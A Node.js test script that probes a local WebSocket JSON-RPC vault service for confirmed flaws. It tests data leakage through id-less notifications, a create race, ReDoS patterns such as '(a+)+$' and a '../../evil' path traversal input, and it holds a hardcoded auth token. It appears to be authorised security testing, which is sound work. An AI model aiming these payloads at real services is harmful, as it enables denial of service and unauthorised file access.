// Deep investigation of confirmed VULNs
const WebSocket = require("ws");

const TOKEN = "2cbaffa84f141fef08bc13f86d1384b94d824b151058b1f2bd72c145165b6e26";
const URL = "ws://127.0.0.1:48765";

async function authedWs() {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(URL);
    const t = setTimeout(() => reject(new Error("connect timeout")), 4000);
    ws.on("open", () => {
      ws.send(JSON.stringify({ jsonrpc: "2.0", method: "authenticate", params: { token: TOKEN }, id: "__auth__" }));
    });
    ws.on("message", (data) => {
      const msg = JSON.parse(data.toString());
      if (msg.id === "__auth__") {
        clearTimeout(t);
        if (msg.result && msg.result.ok) resolve(ws);
        else reject(new Error("auth failed"));
      }
    });
    ws.on("error", (e) => { clearTimeout(t); reject(e); });
  });
}

function rpc(ws, method, params, id) {
  return new Promise((resolve) => {
    const t = setTimeout(() => resolve({ timeout: true }), 8000);
    const handler = (data) => {
      const msg = JSON.parse(data.toString());
      if (msg.id === id) {
        clearTimeout(t);
        ws.removeListener("message", handler);
        resolve(msg);
      }
    };
    ws.on("message", handler);
    ws.send(JSON.stringify({ jsonrpc: "2.0", method, params, id }));
  });
}

async function main() {
  // ---- VULN 1: Notification (no id) returns file content ----
  console.log("\n=== DEEP: VULN-1 Notification leaks vault data ===");
  {
    const ws = await authedWs();
    // Send notification (no id field) for vault.read on a real file
    ws.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.read", params: { path: "Welcome.md" } }));
    const resp = await new Promise(r => {
      const t = setTimeout(() => r({ timeout: true }), 2000);
      ws.once("message", (d) => { clearTimeout(t); r(JSON.parse(d.toString())); });
    });
    console.log("Notification vault.read response:", JSON.stringify(resp));
    if (resp.result && resp.result.content) {
      console.log("CONFIRMED VULN: File content returned for notification (no id):");
      console.log("  Content snippet:", resp.result.content.slice(0, 150));
    }

    // Also try vault.list with no id
    ws.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.list", params: {} }));
    const resp2 = await new Promise(r => {
      const t = setTimeout(() => r({ timeout: true }), 2000);
      ws.once("message", (d) => { clearTimeout(t); r(JSON.parse(d.toString())); });
    });
    console.log("Notification vault.list response:", JSON.stringify(resp2).slice(0, 200));

    ws.close();
  }

  // ---- VULN 2: Race condition on simultaneous creates ----
  console.log("\n=== DEEP: VULN-2 Race condition on simultaneous creates ===");
  {
    const RACE_FILE = "_attack_race_deep.md";
    let doubleCreates = 0;
    const TRIALS = 10;

    for (let trial = 0; trial < TRIALS; trial++) {
      const [ws1, ws2] = await Promise.all([authedWs(), authedWs()]);

      const [r1, r2] = await Promise.all([
        rpc(ws1, "vault.create", { path: RACE_FILE, content: `trial${trial}_c1`, dryRun: false }, `t${trial}a`),
        rpc(ws2, "vault.create", { path: RACE_FILE, content: `trial${trial}_c2`, dryRun: false }, `t${trial}b`),
      ]);

      const ok1 = !!r1.result?.ok, ok2 = !!r2.result?.ok;
      if (ok1 && ok2) {
        doubleCreates++;
        // Read actual content - which client won?
        const ws3 = await authedWs();
        const readResp = await rpc(ws3, "vault.read", { path: RACE_FILE }, "read");
        console.log(`  Trial ${trial}: BOTH succeeded. File content: '${readResp.result?.content}'`);
        await rpc(ws3, "vault.delete", { path: RACE_FILE, dryRun: false }, "del");
        ws3.close();
      } else {
        // Clean up if one succeeded
        const cleanWs = ok1 ? ws1 : (ok2 ? ws2 : null);
        if (cleanWs) await rpc(cleanWs, "vault.delete", { path: RACE_FILE, dryRun: false }, "del");
      }

      ws1.close(); ws2.close();
    }
    console.log(`Race result: ${doubleCreates}/${TRIALS} trials had double-create (TOCTOU)`);
    if (doubleCreates > 0) {
      console.log("CONFIRMED VULN: exists() check and create() are not atomic - TOCTOU race");
      console.log("Impact: duplicate file creation / undefined behavior on concurrent clients");
    }
  }

  // ---- BORDERLINE: (.*a){20} ReDoS took 5 seconds ----
  console.log("\n=== DEEP: ReDoS slow pattern characterization ===");
  {
    const ws = await authedWs();
    const patterns = [
      { pat: "(.*a){20}", label: "original slow" },
      { pat: "(a+)+$", label: "classic catastrophic" },
      { pat: "([a-zA-Z]+)*$", label: "alternation catastrophic" },
    ];
    for (const { pat, label } of patterns) {
      const start = Date.now();
      ws.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.search", params: { query: pat, regex: true }, id: `redos_${label}` }));
      const resp = await new Promise(r => {
        const t = setTimeout(() => r({ timeout: true }), 10000);
        ws.once("message", (d) => { clearTimeout(t); r(JSON.parse(d.toString())); });
      });
      const elapsed = Date.now() - start;
      console.log(`  Pattern '${pat}' (${label}): ${resp.timeout ? 'TIMEOUT (>10s)' : elapsed + 'ms'}`);
      if (elapsed > 3000 || resp.timeout) {
        console.log(`  WARNING: slow pattern took ${elapsed}ms - potential DoS with many files`);
      }
    }
    ws.close();
  }

  // ---- Extra: Check vault.init error message leaks internal path ----
  console.log("\n=== DEEP: vault.init ../../evil error message ===");
  {
    const ws = await authedWs();
    const resp = await rpc(ws, "vault.init", { topic: "../../evil" }, "initdeep");
    console.log("vault.init ../../evil response:", JSON.stringify(resp).slice(0, 300));
    // The error "Cannot read properties of null" leaks internal implementation detail
    // but is not exploitable - note it for the report
    ws.close();
  }
}

main().catch(console.error);
